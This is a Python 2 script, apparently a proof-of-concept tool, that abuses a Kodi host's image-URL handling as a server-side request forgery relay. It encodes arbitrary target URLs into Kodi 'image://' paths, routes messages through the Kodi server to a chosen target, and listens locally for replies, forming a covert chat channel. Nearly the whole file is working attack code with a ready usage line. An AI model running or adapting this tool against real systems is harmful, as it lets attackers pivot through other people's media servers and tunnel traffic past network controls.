import os
import re
import time
import optparse
import threading
import requests
import BaseHTTPServer

def encode_all(string_to_encode):
    encoded = ''
    for c in string_to_encode:
        encoded += '%'
        encoded += c.encode("hex")
    return encoded

def create_url(target, host):
    encoded_target = encode_all(target)
    encoded_target = encode_all("image/image://" + encoded_target)
    return "http://" + host + '/' + encoded_target

class HttpHandler(BaseHTTPServer.BaseHTTPRequestHandler):
    def do_HEAD(s):
        s.send_response(200)
        s.end_headers()
        msg_index = s.path.find("msg=")
        if msg_index == -1:
            return

        message = s.path[msg_index + 4:]
        print "inbound: " + message
        return

    def do_GET(s):
        s.send_response(200)
        s.end_headers()
        return

    def log_message(self, format, *args):
        return

def userHandler(target, host):
    while True:
        text_to_send = raw_input('')
        if (text_to_send == 'exit'):
            os._exit(0)
        text_to_send = text_to_send.replace(' ', '_')
        request = 'http://' + target + '/lol&msg=' + text_to_send
        request = create_url(request, host)
        requests.get(request)

if __name__=="__main__":
    parser = optparse.OptionParser("usage: %prog -k [kodi host] -t [target]")
    parser.add_option("-k", "--kodi-host", dest="host", type="string", help="A Kodi host to route through")
    parser.add_option("-t", "--target", dest="target", type="string", help="The target server to chat with")
    parser.add_option("-p", "--port", dest="port", type="string", help="The port to listen on")

    (options, args) = parser.parse_args()

    if options.host == None or options.target == None or options.port == None:
        print '[-] Host and target must be provided. For example: '
        print '\tpython kodi_chat.py -t 192.168.1.198:8181 -k 192.168.1.40:8080 -p 9090'
        exit(0)

    a = options.target
    threading.Thread(target=userHandler, kwargs={'target': options.target, 'host': options.host}).start()

    server_class = BaseHTTPServer.HTTPServer
    httpd = server_class(('0.0.0.0', int(options.port)), HttpHandler)
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        pass
    httpd.server_close()